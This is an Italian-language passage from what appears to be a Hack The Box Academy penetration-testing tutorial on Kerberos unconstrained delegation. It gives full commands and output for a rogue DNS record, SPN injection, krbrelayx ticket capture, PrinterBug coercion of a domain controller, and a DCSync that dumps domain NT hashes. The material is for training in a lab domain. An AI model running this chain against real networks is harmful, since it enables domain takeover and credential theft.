+Innanzitutto, useremo questo metodo ```dnstool.py``` per aggiungere un record DNS falso ```roguecomputer.inlanefreight.local``` che punta al nostro host di attacco ```10.10.14.2``` utilizzando un qualsiasi account di dominio valido.
+
+```
+# Crea un record DNS falso
+Nanan@htb[/htb]$ git clone -q https://github.com/dirkjanm/krbrelayx; cd krbrelayx
+Nanan@htb[/htb]$ python dnstool.py -u INLANEFREIGHT.LOCAL\\pixis -p p4ssw0rd -r roguecomputer.INLANEFREIGHT.LOCAL -d 10.10.14.2 --action add 10.129.1.207    
+
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+```
+Possiamo verificare se il record DNS è stato creato utilizzando nslookup.
+```
+# Verifica del record DNS
+Nanan@htb[/htb]$ nslookup roguecomputer.inlanefreight.local dc01.inlanefreight.local
+
+Server:     dc01.inlanefreight.local
+Address:    10.129.1.207#53
+
+Name:   roguecomputer.inlanefreight.local
+Address: 10.10.14.2
+```
+Quindi aggiungiamo un SPN creato appositamente al nostro account di destinazione utilizzando ```addspn.py```. L'SPN deve essere ```CIFS/dns_entry```, quindi nel nostro caso utilizziamo l'opzione ```-s``` seguita da ```CIFS/roguecomputer.inlanefreight.local```. ```CIFS``` sta per Common Internet File System, equivalente a SMB. L'opzione  ```--target-type samname``` specifica che la destinazione è un nome utente; se non specificato, ```krbrelayx``` presume che sia un nome host.
+```
+# Creare SPN sull'utente di destinazione (sqldev)
+Nanan@htb[/htb]$ python addspn.py -u inlanefreight.local\\pixis -p p4ssw0rd --target-type samname -t sqldev -s CIFS/roguecomputer.inlanefreight.local dc01.inlanefreight.local 
+
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] SPN Modified successfully
+```
+
+Qualsiasi account che tenti di autenticarsi tramite SMB ```roguecomputer.inlanefreight.local``` avrà una copia del suo TGT nel ticket TGS richiesto. Possiamo usare lo strumento PrinterBug per forzare ```DC01$``` ad autenticarsi con il nostro host falso. Ma prima, dobbiamo cercare il ticket TGS e il TGT sul nostro host attaccante usando ```krbrelayx.py```. Forniamo a questo strumento la chiave segreta dell'account compromesso (hash NT) per decrittografare il ticket TGS ricevuto. In questo caso l'account compromesso e il target è sqldev, quindi dobbiamo fornire il suo hash (```cf3a5525ee9414229e66279623ed5c58```) per decrittografare il ticket TGS ricevuto.
+```
+# Utilizzando Krbrelayx
+Nanan@htb[/htb]$ sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58
+
+[*] Protocol Client SMB loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Running in export mode (all tickets will be saved to disk)
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+
+[*] Servers started, waiting for connections
+```
+
+Se si verifica un errore durante l'esecuzione ```krbrelayx.py```, è necessario rimuovere o aggiornare l'installazione di impacket. I seguenti passaggi descrivono come rimuovere impacket e reinstallarlo dalla sorgente:
+```
+# Rimozione e installazione dell'impacchettamento dalla sorgente
+Nanan@htb[/htb]$ sudo apt remove python3-impacket
+...SNIP...
+Nanan@htb[/htb]$ sudo apt remove impacket-scripts
+...SNIP...
+Nanan@htb[/htb]$ git clone -q https://github.com/fortra/impacket;cd impacket
+Nanan@htb[/htb]$ sudo python3 -m pip install .
+...SNIP...
+```
+
+Quindi sfruttiamo il printer bug. Possiamo usare ```dementor.py``` o ```printerbug.py``` disponibili con ```krbrelayx```.
+
+```
+# Sfruttare il printer bug e con printerbug.py
+Nanan@htb[/htb]$ python3 printerbug.py inlanefreight.local/carole.rose:jasmine@10.129.205.35 roguecomputer.inlanefreight.local
+
+[*] Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
+
+[*] Attempting to trigger authentication via rprn RPC at 10.129.205.35
+[*] Bind OK
+[*] Got handle
+DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Triggered RPC backconnect, this may or may not have worked
+```
+
+In alternativa possiamo usare ```dementor.py```, invece di ```printerbug.py```:
+```
+# Sfruttare il bug della stampante con dementor.py
+Nanan@htb[/htb]$ python dementor.py -u pixis -p p4ssw0rd -d inlanefreight.local roguecomputer.inlanefreight.local dc01.inlanefreight.local
+
+[*] connecting to dc01.inlanefreight.local
+[*] bound to spoolss
+[*] getting context handle...
+[*] sending RFFPCNEX...
+[-] exception DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] done!
+```
+> Nota: non è necessario utilizzare entrambi gli strumenti, ne basta uno solo.
+
+Ciò ha innescato un tentativo di autenticazione di ```DC01``` verso il nostro host attaccante e lo strumento ha estratto automaticamente il TGT incorporato nel ticket TGS.
+
+```
+Krbrelayx esegue l'attacco
+Nanan@htb[/htb]$ sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58
+
+[*] Protocol Client SMB loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Running in export mode (all tickets will be saved to disk)
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+
+[*] Servers started, waiting for connections
+[*] SMBD: Received connection from 10.129.1.207
+[*] Got ticket for DC01$@INLANEFREIGHT.LOCAL [krbtgt@INLANEFREIGHT.LOCAL]
+[*] Saving ticket in DC01$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache
+[*] SMBD: Received connection from 10.129.1.207
+[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
+[*] SMBD: Received connection from 10.129.1.207
+[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
+```
+
+Questo TGT è stato salvato su disco nel seguente file ```DC01$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache```.
+
+Infine, possiamo utilizzare impacket per utilizzare questo ticket esportandone il percorso nella variabile d'ambiente ```KRB5CCNAME``` e quindi utilizzando ```secretsdump.py``` per eseguire un DCSync.
+
+```
+# Utilizzo di Impacket con autenticazione Kerberos per l'attacco DCSync
+
+Nanan@htb[/htb]$ export KRB5CCNAME=./DC01\$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache
+Nanan@htb[/htb]$ secretsdump.py -k -no-pass dc01.inlanefreight.local
+
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
+
+[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+INLANEFREIGHT.LOCAL\Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:810d754e118439bab1e1d13216150299:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+daniel.carter:1109:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+sqldev:1110:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+sqlprod:1111:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+sqlqa:1112:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+svc-backup:1113:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+svc-scan:1114:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+<SNIP>
+```
+
+> Nota: utilizzare il comando unset KRB5CCNAMEper annullare il valore della variabile d'ambienteKRB5CCNAME
+
 
 
 ## Constrained Delegation (S4U2Proxy)
